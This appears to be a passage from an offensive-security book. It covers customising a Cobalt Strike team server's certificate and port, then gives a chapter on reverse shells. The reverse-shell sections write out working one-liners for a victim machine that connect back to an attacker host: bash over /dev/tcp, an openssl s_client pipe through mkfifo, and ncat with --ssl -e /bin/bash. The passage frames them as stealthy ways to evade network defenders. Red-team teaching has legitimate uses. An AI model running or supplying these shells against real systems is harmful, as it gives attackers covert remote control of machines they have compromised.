### Customizing the SSL Certificate and Team Server Port in Cobalt Strike

1. **Locate the Keytool Command:**
   - Open the Cobalt Strike configuration file.
   - Navigate to the end of the file and find the line `keytool -keystore ./cobaltstrike.store`. This command is responsible for generating an X509 certificate for SSL use.

2. **Modify the SSL Certificate Information:**
   - By default, Cobalt Strike generates the SSL certificate with the following information:
     - CN=Major Cobalt Strike
     - OU=AdvancedPenTesting
     - O=cobaltstrike
     - L=Somewhere
     - S=Cyberspace
     - C=Earth
   - You can customize this information to suit your needs. For example, you might change it to:
     - CN=Evil Corp
     - OU=IT
     - O=ECorp
     - L=Atlanta
     - S=xxx
     - C=Mars

3. **Adjust the Team Server Port:**
   - Look for the last line in the configuration file, which should be `java -XX:ParallelGCThreads=4`.
   - Also, locate the value for `-Dcobaltstrike.server_port` and change it to the desired port. For instance, change it to `31337`.

4. **Save and Verify the Changes:**
   - Save the modified configuration file.
   - Use the `cat` command to confirm the changes in the team server script.

5. **Run the Team Server:**
   - Execute the team server using `sudo` along with the IP and password required for authentication.
   - Ensure you use the new port (e.g., 31337) to access the team server.

6. **Log In and Access the Cobalt Strike Interface:**
   - After logging in, the Cobalt Strike interface will be displayed, confirming that the team server is ready for use.

### Summary

This chapter began by exploring red-team exercises and the concept of the cyber kill chain, which is used for planning attack strategies. We then introduced Cobalt Strike, a tool used for red-team operations, and covered its installation, setup, and interface. Finally, we customized the team server script to run on a different port.

In the next chapter, we will discuss reverse shell connections and how to establish them securely from a compromised server to avoid detection.

### Questions

1. **Is it absolutely necessary to plan the attack? Why not just hack it like we do normally?**
2. **Is Cobalt Strike free?**
3. **Can we run multiple team servers on the same instance?**
4. **My team server's fingerprint is different than the one I'm seeing on the display. What could be the reason for this?**
5. **Does Cobalt Strike require the Metasploit framework?**
6. **How can we use Cobalt Strike to exploit a system and get access to it?**
7. **What else can we customize in the team server script?**

### Further Reading

For more information on the topics discussed in this chapter, please visit the following links:

- **Red Team Operations: Determining a Plan of Attack:**
  [https://www.fireeye.com/blog/products-and-services/2016/08/red_team_operations.html](https://www.fireeye.com/blog/products-and-services/2016/08/red_team_operations.html)

- **Red-team tools:**
  [http://psos-security.com/red-teaming-a-tool-for-continuous-improvement/](http://psos-security.com/red-teaming-a-tool-for-continuous-improvement/)

- **Anatomy of a well-run red-team exercise:**
  [https://www.csoonline.com/article/3250249/network-security/anatomy-of-a-well-run-red-team-exercise.html](https://www.csoonline.com/article/3250249/network-security/anatomy-of-a-well-run-red-team-exercise.html)

- **CobaltStrike:**
  [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)

### Reverse Shell Connections

#### Introduction

In this chapter, we will focus on establishing a reverse connection from an exploited system. We will cover different methods for getting a secure reverse connection, including the difference between non-encrypted and encrypted channels, and analyze the network noise level using `tcpdump`.

#### Technical Requirements

- Metasploit Framework
- netcat, socat, cryptcat, powercat
- ngrok

#### Unencrypted Reverse Connections Using Netcat

1. **Start the Listener:**
   - Use the command `nc -lv 8080` to start a listener on port 8080.
   - Verify the port is in the LISTEN state with `netstat -an | grep 8080`.

2. **Analyze Network Packets:**
   - Start `tcpdump` to capture packets on the localhost interface: `sudo tcpdump -XX -i lo0 port 8080`.

3. **Establish the Connection:**
   - Wait for the client to connect to the netcat server.
   - Send sensitive information, such as a passcode, and observe that `tcpdump` can easily sniff the unencrypted data.

#### Encrypted Reverse Connections Using OpenSSL

1. **Generate an SSL Certificate:**
   - Use the command `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes` to generate a custom SSL certificate.

2. **Start the SSL Server:**
   - Use the command `openssl s_server -quiet -key key.pem -cert cert.pem -port 8080` to start an SSL server listening on port 8080.

3. **Connect the Client:**
   - Connect the client to the SSL server using `openssl s_client -quiet -connect <server_ip>:8080`.
   - Observe that the passcode sent over the wire is now encrypted.

#### Introduction to Reverse Shell Connections

A reverse shell is a type of shell where the target server connects back to the attacker's machine. This is useful when the firewall blocks incoming connections on non-standard ports. The attacker can use allowed ports (e.g., 21/tcp, 80/tcp, 443/tcp) to establish a reverse shell connection.

#### Unencrypted Reverse Shell Using Netcat

1. **Start the Listener:**
   - Use the command `nc -lv 8080` to start a listener on the attacker's machine.

2. **Execute the Command on the Victim Machine:**
   - Use the command `Bash -i >& /dev/tcp/<attacker_ip>/8080 0>&1` to connect back to the attacker's machine.

3. **Verify the Connection:**
   - Execute commands like `whoami` and `id` to confirm the connection. Note that the communication is unencrypted and can be detected by network administrators.

#### Encrypted Reverse Shell for *nix with OpenSSL

1. **Start the SSL Server:**
   - Use the command `openssl s_server -quiet -key key.pem -cert cert.pem -port 8080` to start an SSL server on the attacker's machine.

2. **Execute the Command on the Victim Machine:**
   - Use the command `mkfifo /tmp/z; /bin/bash -i &> /tmp/z | openssl s_client -quiet -connect <attacker_ip>:8080` to establish an encrypted reverse shell.

3. **Verify the Connection:**
   - Execute commands like `whoami` and `id` to confirm the encrypted connection.

#### Encrypted Reverse Shell Using Ncat

1. **Start the Listener:**
   - Use the command `ncat -l 8080 --ssl -v` to start a listener on the attacker's machine.

2. **Execute the Command on the Victim Machine:**
   - Use the command `ncat <attacker_ip> 8080 --ssl -e /bin/bash -v` to establish an encrypted reverse shell.

3. **Verify the Connection:**
   - Execute commands like `id` to confirm the encrypted connection.

By following these steps, you can establish secure and stealthy reverse shell connections, making it difficult for defenders to detect your presence in the network.